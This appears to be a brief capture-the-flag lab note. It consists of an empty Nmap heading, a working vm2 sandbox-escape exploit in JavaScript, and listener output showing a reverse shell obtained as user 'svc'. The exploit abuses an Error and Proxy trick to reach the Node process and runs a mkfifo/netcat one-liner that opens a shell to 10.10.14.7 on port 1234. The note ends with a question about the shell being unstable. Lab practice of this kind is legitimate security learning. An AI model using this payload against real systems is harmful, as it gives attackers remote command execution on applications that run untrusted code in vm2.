# Nmap
```bash

```

## VM2 RCE
```
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 1234>/tmp/f").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

rlwrap nc -lnvp 1234    
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.239] 37654
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
Shell keep dying. Is the shell suppose to be so unstable or its just my WiFi's slow?
